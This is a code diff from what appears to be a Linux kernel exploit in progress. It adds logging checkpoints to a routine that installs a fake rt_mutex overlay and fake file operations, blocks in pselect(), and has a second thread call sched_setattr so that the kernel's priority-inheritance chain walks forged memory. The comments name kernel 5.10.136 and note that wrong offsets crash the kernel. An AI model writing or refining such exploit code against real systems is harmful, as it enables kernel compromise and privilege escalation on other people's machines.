@@ -167,6 +167,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void do_pselect_fake_lock_route(void) {
+  /* Durable entry checkpoint: proves the waiter actually reached the
+   * pselect route (the setup pr_info below is NOT fsync'd and is lost on
+   * a panic reboot). */
+  pr_success("ckpt: do_pselect enter page=%016zx lock=%016zx fops=%016zx\n",
+             page_base, fake_lock, fake_fops);
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
@@ -246,10 +251,20 @@ void do_pselect_fake_lock_route(void) {
     };
     struct timespec *timeoutp = &timeout;
 
+    /* Durable bracket around the danger zone: while pselect() blocks with
+     * the fake rt_mutex overlay installed, the consumer fires sched_setattr
+     * on the waiter tid, driving rt_mutex_adjust_prio_chain across our
+     * overlay words. A wrong 5.10.136 word table Oopses HERE. If the log
+     * shows "arming" for attempt N with no matching "survived", that attempt
+     * panicked the kernel. */
+    pr_success("ckpt: pselect attempt=%d arming shift=%d (consumer firing)\n",
+               route_attempt, PSELECT_WAITER_WORD_SHIFT);
     errno = 0;
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
     atomic_store(&punch_consume_go, 0);
+    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d\n",
+               route_attempt, ret, saved_errno);
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
